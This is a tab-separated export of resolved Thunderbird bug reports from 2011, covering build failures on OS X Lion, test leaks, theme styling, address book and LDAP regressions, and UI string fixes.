675300%TAB%1311938303%TAB%339434%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%Can't build Thunderbird on Lion.%TAB%Can't build Thunderbird on Lion.I've applied the patches from the bugs listed in http://blog.mozilla.com/respindola/2011/07/26/building-firefox-on-os-x-lion/ but I'm still running into the error: g++-4.2 -o nsMsgCopyService.o -c  -fvisibility=hidden -DMOZ_LDAP_XPCOM -DMOZILLA_INTERNAL_API -D_IMPL_NS_COM -DEXPORT_XPT_API -DEXPORT_XPTC_API -D_IMPL_NS_GFX -D_IMPL_NS_WIDGET -DIMPL_XREAPI -DIMPL_NS_NET -DIMPL_THEBES  -DZLIB_INTERNAL -DMOZ_THUNDERBIRD=1 -DOSTYPE=\"Darwin11.0.0\" -DOSARCH=Darwin -DHAVE_MOVEMAIL  -I/Users/bwinton/Programming/thunderbird/src-central/mailnews/base/src -I. -I../../../mozilla/dist/include -I../../../mozilla/dist/include/nsprpub  `/Users/bwinton/Programming/thunderbird/objdir-src-central-default/mozilla/dist/sdk/bin/nspr-config --prefix=/Users/bwinton/Programming/thunderbird/objdir-src-central-default/mozilla/dist --includedir=/Users/bwinton/Programming/thunderbird/objdir-src-central-default/mozilla/dist/include/nspr --cflags` -I/Users/bwinton/Programming/thunderbird/objdir-src-central-default/mozilla/dist/include/nss      -fPIC  -fno-rtti -fno-exceptions -Wall -Wpointer-arith -Woverloaded-virtual -Wsynth -Wno-ctor-dtor-privacy -Wno-non-virtual-dtor -Wcast-align -Wno-invalid-offsetof -Wno-variadic-macros -Werror=return-type -isysroot /Developer/SDKs/MacOSX10.7.sdk -fno-strict-aliasing -fpascal-strings -fno-common -fshort-wchar -pthread -DNO_X11 -pipe  -DDEBUG -D_DEBUG -DTRACING -g   -DMOZILLA_CLIENT -include ../../../comm-config.h -MD -MF .deps/nsMsgCopyService.pp /Users/bwinton/Programming/thunderbird/src-central/mailnews/base/src/nsMsgCopyService.cpp In file included from /Users/bwinton/Programming/thunderbird/src-central/mailnews/base/util/nsMsgI18N.cpp:58: ../../../mozilla/dist/include/nsUTF8Utils.h:322: error: variable or field ‘NS_ALWAYS_INLINE’ declared void ../../../mozilla/dist/include/nsUTF8Utils.h:322: error: expected ‘;’ before ‘write’  I'm happy to try anything to get this building, if you needed a test copy of the repo.
674352%TAB%1311682489%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%Precompile startup cache for Thunderbird%TAB%Precompile startup cache for ThunderbirdThe seamonkey and thunderbird folks should be interested, too. (with the > patch, you only need to add GENERATE_CACHE=1 before including packager.mk to > benefit from startupcache, if you're omnijar'ed When I do this, make installer fails    adding: greprefs.js (172 bytes security) (deflated 74%) can't open ../../../toolkit/mozapps/installer/precompile_cache.js: No such file or directory -e:1: ReferenceError: populate_startupcache is not defined  If I had to guess as to the cause, I'd say it was because we put the mozilla tree under the source directory, so the correct path would be:  ../../mozilla/toolkit/mozapps/installer/precompile_cache.js  I'll see if we can control this somehow in our Makefile.
673884%TAB%1311560919%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%update removed-files.in for bug 643816%TAB%update removed-files.in for bug 643816Bug 643816 caused D3DCompiler_42.dll and d3dx9_42.dll to be removed, we need to add them to removed-files.in still.
673880%TAB%1311558109%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Port Bug 406026 - Consider allowing the blocklist url to direct to a particular point in the blocklist%TAB%Port Bug 406026 - Consider allowing the blocklist url to direct to a particular point in the blocklistBug 406026 implemented pointing blocklisted extensions to specific detail pages on AMO. We need to have the preferences updated for Thunderbird otherwise users clicking on the blocklist link just get nothing.  Note that I'm not convinced extensions.blocklist.detailsURL is actually used still, but I'll update it anyway.
673826%TAB%1311521989%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Theme%TAB%Improve borders in various themes%TAB%Improve borders in various themesBy "various themes" here, I mean "everything but Mac", since I don't have a Mac...  Most of these issues are fairly nitpicky, but they're also pretty easy to fix, so it all evens out:  * XP and Linux have an unnecessary border on the right side of the 3pane * XP splitter borders look too flat * There's a 1px white space between the message header and the message body * The message header in the standalone message window has extra borders on the   left and right * There's no border around the standalone message window in Windows 7
673480%TAB%1311326298%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Address Book%TAB%Can not delete Mailing Lists,Cannot delete Mailing Lists%TAB%Can not delete Mailing Lists,Cannot delete Mailing ListsBug 652855 introduced a regression - we can no longer delete address book mailing lists.  Applies to TB 7.0 and trunk.  Steps to reproduce:  1)  Open Address Book manager, and add a mailing list to any address book 2)  Try to delete that address book, pressing OK on the confirmation dialog  What happens?  The confirmation dialog goes away, but the mailing list still exists.  The following error appears in the error console:  Error: An error occurred executing the button_delete command: [Exception... "Component returned failure code: 0x80004005 (NS_ERROR_FAILURE) [nsIAbManager.deleteAddressBook]"  nsresult: "0x80004005 (NS_ERROR_FAILURE)"  location: "JS frame :: chrome://messenger/content/addressbook/abCommon.js :: AbDeleteDirectory :: line 232"  data: no] Source File: chrome://global/content/globalOverlay.js Line: 75  What's expected?  The mailing list should be removed.
673322%TAB%1311264484%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Toolbars and Tabs%TAB%Multi-message summary buttons don't match message header buttons%TAB%Multi-message summary buttons don't match message header buttonsOn Windows and Linux, the multi-message summary button don't match their message header counterparts. This is especially bad on Linux, since the multi-message buttons don't have icons (see attached screenshot).  Patch for Linux forthcoming. I could use some help with Windows and Mac, since I'd just be doing guesswork to fix them.  As a note, I intentionally made the buttons line up so that the delete button is in exactly the same spot in both the multi-message and the single-message (assuming the multi-message doesn't have a scrollbar). For anyone who'd like to help out on other platforms, it would be nice if we did that there as well.
673268%TAB%1311254253%TAB%4410%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Testing Infrastructure%TAB%test_imapContentLength.js leaks%TAB%test_imapContentLength.js leaksthe test is registering a listener but not unregistering when it's done.
673049%TAB%1311197050%TAB%420574%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%Forwarding an .eml message causes message compose error%TAB%Forwarding an .eml message causes message compose errorUser Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0.1) Gecko/20100101 Firefox/5.0.1 Build ID: 20110707182747  Steps to reproduce:  Save a message to .eml format Open .eml message in TB (opens in new window) Click on Forward    Actual results:  First attempt, compose window opens with blank subject line On second attempt, error: An error occurred while creating a message compose window. Please try again.    Expected results:  Compose window should open as normal without error so email can be forwarded
673022%TAB%1311177252%TAB%4410%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Search%TAB%test_imapFilterActions leaks a lot of state%TAB%test_imapFilterActions leaks a lot of statetest_imapFilterActions.js leaks a lot. The main problem was a listener that was not unregistered, but there was also some confusion about unregistering pending db listeners which I've fixed. (An exception was getting thrown, but the exception was because we were using Unregister... instead of unregister). I fixed that because I went to some trouble to make pending listeners do the right thing w.r.t. to dealing with active listeners and I don't want code out there that implies they don't.
672964%TAB%1311166976%TAB%4410%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Search%TAB%test_searchBoolean.js leaks the world%TAB%test_searchBoolean.js leaks the worldtest_searchBoolean.js leaks a bunch of stuff. Fix is to unregister the listener (yeah, it would be nice if searchSessions knew how to do this themselves.
672830%TAB%1311147268%TAB%288265%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%Very slow autocomplete on 7.0a2, os x%TAB%Very slow autocomplete on 7.0a2, os xFor a couple of days I've noticed exceedingly slow autocomplete in the composition window: 2-4 seconds of delay between keystroke and autocomplete popup showing up.  I'm using:  Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:7.0a2) Gecko/20110720 Thunderbird/7.0a2  I thought it was ldap, but disabling the ldap addressbook and restarting didn't fix it.  Wondering whether some of the addressbook de-rdfification could have had perf impact?  Stats:   - personal address book: 1621 entries  - collected addresses: 1376 entries  - OS X address book: 1098 entries
672691%TAB%1311088636%TAB%4410%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Testing Infrastructure%TAB%get rid of xpcshell test leaks in test_askuser.js%TAB%get rid of xpcshell test leaks in test_askuser.jsextensions/mdn/test_askuser.js reports a bunch of leaks. We should get rid of the noise. Adding the mailshutdown code fixes the leaks. Picking on rkent because I've got a couple more patches for him to review
672189%TAB%1310965514%TAB%387469%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Search,Theme%TAB%Accessibility: Quick Filter bar results not visible when using High Contrast Black theme,Quick Filter bar results not visible when using High Contrast Black theme (port bug 575841 to aero)%TAB%Accessibility: Quick Filter bar results not visible when using High Contrast Black theme,Quick Filter bar results not visible when using High Contrast Black theme (port bug 575841 to aero)User Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.2.18) Gecko/20110614 Firefox/3.6.18 Build ID: 20110614230723  Steps to reproduce:  Selected the High Contrast Theme Used the TB5 Quick Filter bar to search   Actual results:  Text of results was the same colour as the background so not visible   Expected results:  The text and background should be a different colour. Preferably, for me, honouring the TB5 colour settings (which I have as white text on a black background).  The problem was raised and closed for TB3.1 in bug #575841 but was not actually fixed.
672022%TAB%1310776578%TAB%414915%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Folder and Message Lists%TAB%Thunderbird 5 does not sort messages properly,Thunderbird 5 does not sort address columns correctly if showing only display name%TAB%Thunderbird 5 does not sort messages properly,Thunderbird 5 does not sort address columns correctly if showing only display nameUser Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0 Build ID: 20110615151330  Steps to reproduce:  Click on the From column header   Actual results:  The messages were not sorted alphabetically by the sender's name   Expected results:  The messages should be sorted alphabetically by the sender's name
671936%TAB%1310725513%TAB%258002%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Folder and Message Lists%TAB%threading gets worse when a search folder combining IMAP Inbox and Sent is reopened%TAB%threading gets worse when a search folder combining IMAP Inbox and Sent is reopenedthis is about a search folder showing all messages from IMAP inbox and sent, threaded and sorted by date (or received), ascending  for the purpose of this bug I'll define "correct threading" as the one that is produced by either  a. toggling threading off and on  or  b. re-sorting the folder (i.e. two distinct clicks on the header of the sort by column)  this "correct threading" not perfect, but it's the best that TB can do at the moment.  After establishing "correct threading" reopen the folder (switch to another one and back).  Threading gets screwed up in most or all threads.  Example:  out1 ..in1 ....out2 ....out3 ......in2  turns into:  out1 ..in1 ....in2 ....out2 ....out3   "correct threading" can be reestablished, but will get screwed again up on the next reopen
671921%TAB%1310721776%TAB%278074%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Account Manager%TAB%Minor string change: "Double check" in New Account Wizard should probably be hyphenated%TAB%Minor string change: "Double check" in New Account Wizard should probably be hyphenatedThis string (which appears after performing STR in bug 671917)... >  double_check_email=Double check this email address! ...probably wants to say "Double-check this email address!" (needs a hyphen between "Double" and "check")  Link to source: http://mxr.mozilla.org/comm-central/source/mail/locales/en-US/chrome/messenger/accountCreation.properties#67  Justification: ============== * http://dictionary.reference.com/browse/double+check says that the non-hyphenated version refers to a particular move in chess, whereas the hyphenated version has the meaning that we clearly intend.  * http://www.kcitraining.com/styleguide/hyphens.html says "Two or more words that act together to form a new meaning are hyphenated" and gives double-check as an example. (no idea how authoritative kcitraining.com is, but their explanation seems to make sense)
671904%TAB%1310717742%TAB%278074%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Account Manager%TAB%New Account Wizard's "Username or password invalid" warning is unreadable (gray-on-black) in Ubuntu 11.04,New Account Wizard bad-input warnings are unreadable (gray-on-black) in Ubuntu 11.04 (e.g. "Please enter your name", "Double-check this email address", "Username or password invalid"),New Account Wizard bad-input warnings are unreadable (gray-on-black) in Ubuntu 11.04 (e.g. "Please enter your name", "Double check this email address", "Username or password invalid")%TAB%New Account Wizard's "Username or password invalid" warning is unreadable (gray-on-black) in Ubuntu 11.04,New Account Wizard bad-input warnings are unreadable (gray-on-black) in Ubuntu 11.04 (e.g. "Please enter your name", "Double-check this email address", "Username or password invalid"),New Account Wizard bad-input warnings are unreadable (gray-on-black) in Ubuntu 11.04 (e.g. "Please enter your name", "Double check this email address", "Username or password invalid")STR:  1. Start Thunderbird with a fresh profile.  2. Invoke account setup (happens automatically on first run)  3. Type a bad password, and try to create account  ACTUAL RESULTS: The text "Username or password invalid" is very hard to read -- it's gray text in a gray-backgrounded dialog, highlighted in black.  I have the default Ubuntu 11.04 theme. I don't recall seeing black-highlighted text (or black backgrounds for text) in any other application, so I don't think this is simply a my-gtk-theme-is-busted issue.
671827%TAB%1310699294%TAB%420144%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window,Address Book%TAB%LDAP working in TB 3.1, not working in TB 5,LDAP search is broken when using GSSAPI binding%TAB%LDAP working in TB 3.1, not working in TB 5,LDAP search is broken when using GSSAPI bindingUser Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.122 Safari/534.30  Steps to reproduce:  After upgrading from TB 3.1 to TB 5 LDAP stopped working.    Actual results:  After upgrade LDAP settings in TB 5 are identical to those in TB 3.1 still LDAP is not working. LDAP still works on TB 3.1 installed in another directory. After generating log from LDAP query in TB 3.1 and TB 5 seems that there are major differences in filter which both use to query LDAP - see attachments.
671726%TAB%1310657742%TAB%306754%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%operationFailedFolderBusy -- another should be another, not an other%TAB%operationFailedFolderBusy -- another should be another, not an otherThis should be a relatively simple review, and shouldn't require changing the property name either.
671236%TAB%1310526125%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Flatter appearance for quick filter bar%TAB%Flatter appearance for quick filter barThe quick filter bar sticks out a bit visually from the rest of the Aero theme. Lets look into how we can solve this.
671132%TAB%1310483822%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Theme%TAB%if switching from icon+text to just text the text becomes misaligned%TAB%if switching from icon+text to just text the text becomes misalignedAn odd issue that bwinton mentioned the other day was that if you switch the toolbar from "Icons and Text" to just "Text" the text ends up being misaligned inside the buttons for Get mail, Write and Address book (but not tags, because it's a different widget). Switching back to another button view fixes the problem.
670976%TAB%1310458562%TAB%287836%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%General,Folder and Message Lists%TAB%aFolder is undefined - in folderWidgets.xml%TAB%aFolder is undefined - in folderWidgets.xmlUser Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20100101 Firefox/5.0 Build ID: 20110615151330  Steps to reproduce:  No idea what I did, but I see multiple errors   Error: aFolder is undefined Source File: chrome://messenger/content/folderWidgets.xml Line: 691  I'm not seeing broken functionality except with Spotlight searcing which seems unrelated -  I'm running nightlies of Miramar 5.0b2pre (this new bugzilla interface doesn't seem to allow that to be input anywhere 
670639%TAB%1310353990%TAB%158464%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Theme%TAB%Compose, message and address book windows should support personas%TAB%Compose, message and address book windows should support personasThis is pretty easy since the LWT code is already present. Just add the lightweightthemes="true" attribute to the window tag of each window and some minor adjustments to the CSS. I haven't got a comm-central tree to patch it myself.
670566%TAB%1310300473%TAB%287836%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Search%TAB%Spotlight on Mac not finding ANY messages%TAB%Spotlight on Mac not finding ANY messagesUser Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20100101 Firefox/5.0 Build ID: 20110615151330  Steps to reproduce:  I've used spotlight to search for word that I know occurs in multiple messages (e.g. Facebook). I've used this before, but not for a while.  Now zero messages from TB are showing up, though files, and other components (e.g. Address book entries) are showing up fine.   Searching in TB's search field finds the messages fine, so it doesn't appear to be an indexing problem on TB.   Preferences/General/Allow Spotlight is enabled, as i Preferences/Enable Gloda.
670502%TAB%1310257610%TAB%138192%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%Opening account manager from compose window fails,Opening account manager (account settings) from compose window fails%TAB%Opening account manager from compose window fails,Opening account manager (account settings) from compose window failsOpening the account manager from compose window -> Tools menu fails without an error in error console.  Tested with Thunderbird 5.0 and todays 8.0-comm-central build in safe-mode.
670468%TAB%1310212431%TAB%23402%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Installer%TAB%Shredder update from 20110708 to 20110709 results in unstartable application due to jemalloc.%TAB%Shredder update from 20110708 to 20110709 results in unstartable application due to jemalloc.Mac OS X 10.5 Macbook Pro  I haven't tried to reproduce this yet.  1. Install Shredder.app from prior to 2011-07-08. 2. Update to 2011-07-08 and restart. 3. Update to 2011-07-09 and fail to restart. 4. Attempt to start Shredder and fail.  From the command line  $ open Shredder.broken.app/ LSOpenFromURLSpec() failed with error -10810 for the file /Applications/Shredder.broken.app.  I think this is due to jemalloc  $ diff -ur Shredder.broken.app Shredder.app/  Only in Shredder.broken.app/Contents/MacOS: active-update.xml Only in Shredder.app/Contents/MacOS: libjemalloc.dylib Only in Shredder.broken.app/Contents/MacOS: updates Only in Shredder.broken.app/Contents/MacOS: updates.xml  Downloading a fresh Shredder build and installing it works fine. I think this would be a possible issue when upgrading to a jemalloc enabled build. I did not see this problem with today's Firefox Nightly build.
670304%TAB%1310144238%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Buttons on the tab bar should match Firefox%TAB%Buttons on the tab bar should match FirefoxIn Firefox under Aero, the buttons on the tab bar (usually "All Tabs" and the tab scroll arrows, but anything can go there) have a gradient background instead of a button background. We should do this. It would also provide a nice alternative for the quick filter bar, which is styled like a tab right now (that's bug 667244).
670159%TAB%1310108098%TAB%4410%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Testing Infrastructure%TAB%need unit test for move/copying a message to a local folder whose db is out of date%TAB%need unit test for move/copying a message to a local folder whose db is out of dateThe pluggable store code needs a unit test for move/copying a message to a local folder whose db is out of date. We should do our best to allow it, but if we don't, we should make sure the error doesn't leave the folder locked, which would prevent the user from clicking on the dest folder and rebuilding the db.  Ideally, we would rebuild the db, then do the move/copy, if possible.
669925%TAB%1310023705%TAB%289285%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Folder and Message Lists%TAB%Wrong "From" shown in message list.,Wrong "From" shown in message list when email address contains Unicode%TAB%Wrong "From" shown in message list.,Wrong "From" shown in message list when email address contains UnicodeUser Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0 Build ID: 20110615151330  Steps to reproduce:  I opened my spam folder. I saw a mail, which has a name in the "From"-column, that I know (I also have an address book entry to this name, but without an eMail address). This name was not shown in the from-field of the preview. The name also doesn't occur in the message source.   Actual results:  There is a name shown in the "From"-column, which is not part of the source.   Expected results:  "From" of message list and message preview should be the same. No values should appear that aren't part of the source.  As this a spam mail, some users give more credibility, if they "know" the sender.
669647%TAB%1309933087%TAB%4410%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Testing Infrastructure%TAB%need a unit test for undoing local message move/copy%TAB%need a unit test for undoing local message move/copyI'm pretty sure undo doesn't work correctly with the maildir pluggable store, but the unit tests all pass, so I think we need xpcshell tests for this. We have tests for imap undo.
669615%TAB%1309927684%TAB%320634%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%General%TAB%Feature request:  Downloads window%TAB%Feature request:  Downloads windowUser Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20100101 Firefox/5.0 Build ID: 20110615151330  Steps to reproduce:  downloaded many attachments   Actual results:  the attachment downloaded satisfactorily, but were not listed in a Downloads window, such as is available in Firefox (key command cmd+J)   Expected results:  I would like to suggest a Downloads window be added to Thunderbird, providing identicaly functionality to that currently available in Firefox
669504%TAB%1309874328%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Mail Window Front End%TAB%Port bug 649373 - remove the PRE_RELEASE_SUFFIX so that nightly/aurora builds don't have Alpha in their window titles%TAB%Port bug 649373 - remove the PRE_RELEASE_SUFFIX so that nightly/aurora builds don't have Alpha in their window titlesFrom bug 649373:  (In reply to comment #0) > Aurora blank windows have "Alpha 2" in the title. Aurora will always have > [version]a2 as its version. We should remove the "Alpha 2"  (In reply to comment #3) > My understanding from #developers is that the actual summary should be "Drop > the whole PRE_RELEASE_SUFFIX thing." >  > mozilla-central will always be n.0a1, never pre, and never released or > branded, so a screenshot with "Nightly" in the titlebar can't be confused > with anything; mozilla-aurora will always be n.0a2, never pre, never > branded, and we're fine with having no way to tell the difference between a > screenshot of a shipped Aurora and a tinderbox-build Aurora; mozilla-beta > will always be n.0, never pre, always branded, and we're fine with having no > way to tell the difference between a screenshot of the very first > tinderbox-build from mozilla-beta and the final release of Firefox n.0.  I think it is reasonable that we do the same for Thunderbird - it is a bit strange that it says Alpha 1/Alpha 2 when it is always that according to the branch, and the branding will tell us the difference between branches anyway.
669463%TAB%1309868117%TAB%306754%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%OS Integration%TAB%WSEnable.exe needs to have its manifest set to requireAdministrator%TAB%WSEnable.exe needs to have its manifest set to requireAdministratorI noticed this while setting it up on a new computer -- this was broken by bug 567497. Sid and I think that this is broken in 3.1.11 and 5.0, so it's something support and qa should know about.  The manifestation of the bug is that when the default mail app prompt comes up, and the user checks the "enable windows search" checkbox, we don't remember that setting.  I had a separate issue w/ and w/o this patch that toggling that check box from the options UI didn't work. I think that's not related to this issue, but I don't know for sure. With this patch, the startup prompt does work.
669309%TAB%1309844848%TAB%198415%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Reader UI%TAB%Thunderbird 5 doesn't display some attachment size,Thunderbird 5 doesn't display some attachment size multipart/mixed + multipart/alternative%TAB%Thunderbird 5 doesn't display some attachment size,Thunderbird 5 doesn't display some attachment size multipart/mixed + multipart/alternativeIn Thunderbird 5, I often see a message indicating that the attachment size of my message is "unknow" (see attached screenshot). I don't understand why Thunderbird doesn't display these attachments size. It is an IMAP account and the folder is configure to download all message locally.
669285%TAB%1309836345%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Theme%TAB%Look into if we should give some color to the sidebar%TAB%Look into if we should give some color to the sidebarSimilar to bug #614215 where we give some color to the sidebar under Aero, it might be good to do so under Linux as well, especially with the smaller resize grips in bug #666232  One possibility would be to use a very, very light tint of Highlight or perhaps -moz-EvenTreeRow. Both of these might cause issues under certain themes.  That said, it might work well without any sidebar color as well.
669242%TAB%1309797153%TAB%287320%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Account Manager%TAB%"Copies & Folders" account settings pane should assign ids to groupboxes so addons can add to them%TAB%"Copies & Folders" account settings pane should assign ids to groupboxes so addons can add to themUser Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0 Build ID: 20110615151330  Steps to reproduce:  Tried to add something from my add-on to the "Drafts, Archives, and Templates" groupbox on the "Copies & Folders" pane of the account settings.   Actual results:  I couldn't do it since the groupbox has no id.   Expected results:  The groupbox should have an id so that I can add to it in an overlay.
669235%TAB%1309792374%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Address Book%TAB%Address book search box should have flexible width%TAB%Address book search box should have flexible widthThe address book search box is statically sized. I think it should be flexible, like the gloda search box, since it's currently a waste of space if you size the address book to be fairly wide. Attached is a (very) simple patch to do this.
668869%TAB%1309514827%TAB%4410%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%port ffox work to lazily load libxul to speed up start-up perf and remove wrapper startup script%TAB%port ffox work to lazily load libxul to speed up start-up perf and remove wrapper startup scriptThunderbird equivalent of bug 552864. Attached patch doesn't compile, but shows some of the direction. I think I need to make more changes to the mail/app Makefile.
668756%TAB%1309481235%TAB%402548%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%General,Mail Window Front End%TAB%decimal separator according to TB locale version%TAB%decimal separator according to TB locale versionUser Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0 Build ID: 20110615151330    Actual results:  Wherever TB shows a filesize, decimal separator is used. But in some countries people are using decimal "comma" instead of decimal point. TB uses decimal point always and everywhere.  (reported http://forum.mozilla.cz/viewtopic.php?f=4&t=4385)   Expected results:  The decimal separators should be 'localizable' or customizable - '.' or ','.
668631%TAB%1309434769%TAB%7044%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Mail Window Front End%TAB%Dragging message(s) over a folder doesn't give highlight the drop folder%TAB%Dragging message(s) over a folder doesn't give highlight the drop folderI frequently drag messages to folders in the folder pane. In the previous version of Thunderbird, when I dragged over the folder the folder would highlight. This was very useful because I knew I had "hit" the correct folder. Now I get no visual feedback that I've got the correct folder because it doesn't highlight.  Thunderbird 5.0 (release), Windows.
668590%TAB%1309426518%TAB%4410%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Testing Infrastructure%TAB%messageGenerator should use AddMessage%TAB%messageGenerator should use AddMessagemailnews/test/resources/messageGenerator writes directly to a berkeley mailbox. It should use addMessage instead and let the folder handle it.  this is fallout from the pluggable store work, but I've separated it out as part of my effort to make that patch smaller.
668494%TAB%1309409103%TAB%373850%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Folder and Message Lists,Theme%TAB%Highlight of mailboxes crosses the characters,Highlight of mailboxes crosses the characters in high-DPI mode%TAB%Highlight of mailboxes crosses the characters,Highlight of mailboxes crosses the characters in high-DPI modeUser Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0 Build ID: 20110615151330  Steps to reproduce:  Click on and/or hover over a mailbox   Actual results:  A rectangle is drawn that crosses the bottom of some characters (the "g"), see screenshot. I am using Windows 7 64.   Expected results:  The rectangles should not cross the characters
667391%TAB%1309124075%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Toolbars and Tabs%TAB%Restoring to default toolbar state changes to text below icons%TAB%Restoring to default toolbar state changes to text below iconsFor the main toolbars (that is, anything except the message header toolbar), restoring to the default set will cause the icons to change to "Icons and Text" instead of "Icons Beside Text". That's not right, and can make things look really bad (see URL courtesy of Asa Dotzler). This is just a simple case of someone forgetting to add defaultlabelalign="end" to the toolbox.  :bwinton, I hope I'm not inundating you with too many reviews. :) Feel free to reassign if need be.
667384%TAB%1309119562%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Message Reader UI%TAB%When "From" header is pushed down by message header buttons, too much space is wasted%TAB%When "From" header is pushed down by message header buttons, too much space is wastedWhen the "From" header doesn't fit on the first row of the header beside the buttons, it gets pushed down; this is good. However, we waste 14px of space when doing so because of some padding set on the From field to make it line up with the buttons when it *doesn't* get pushed down; this is bad.  In addition, 14px is more than we need to line the "From" header up with the buttons. 10px is sufficient.  Attached is a patch to fix this; I also removed the HTML tag from the message header, since it's not actually necessary (setting "display: block" gets us all the niceties we need from HTML's rendering model).  In conclusion: this patch saves us between 6px and 14px vertically.Screenshots forthcoming.
667252%TAB%1309013963%TAB%306754%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Account Manager%TAB%Autoconfig wizard: Fix styling and order of buttons on Windows%TAB%Autoconfig wizard: Fix styling and order of buttons on WindowsThe Windows platform standard is to have cancel as the rightmost button. The patch uses CSS box ordinals to fix this. (I've also cleaned up a bit of unused CSS code.)  Also, different sizes for button text is pretty non-standard. As a replacement, bwinton suggested bolding the important buttons, so I've done that.  One thing I'm concerned about is third-party themes -- all of them would also have to include the same CSS. I'm not sure if we have a way to not do this, or if this is worth worrying about at all.  Blake, is it fine if you do both the code and the UI reviews?  (note: I spent a whole day trying to use a XUL dialog to get the correct order, but it's just broken for anything non-trivial)
667248%TAB%1309010022%TAB%5003%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%menubar and primary toolbar buttons are impossible to read,menubar and primary toolbar buttons are impossible to read with aero-glass effect%TAB%menubar and primary toolbar buttons are impossible to read,menubar and primary toolbar buttons are impossible to read with aero-glass effectthe aero glass menubar and aero glass toolbar makes the menus and the primary toolbars almost impossible to read. This area should not be glass or the menu items and buttons should be styled differently.
667245%TAB%1309009701%TAB%5003%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%the widget for switching folder pane views is heavy and ugly%TAB%the widget for switching folder pane views is heavy and uglyThe widget for cycling through the folder pane views is heavy and ugly. It's the larger and darker than any other icon in the interface. I don't believe this is the correct widget either. Ideally it'd be a select or a menu or something. It's not clear at all that the arrows are buttons or that they act on the title of the current view. At a minimum, they need to be styled more obvious and less heavy.
667244%TAB%1309009534%TAB%5003%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%toggle quckfilter toolbar should not be a tab,toggle quickfilter toolbar should not be a tab%TAB%toggle quckfilter toolbar should not be a tab,toggle quickfilter toolbar should not be a tabtoggling the quick filter toolbar with a tab is odd and confusing. This should be a toggle button or a checkbox in a menu somewhere. The control being used today makes little sense and is not discoverable and does not communicate its toggled state.
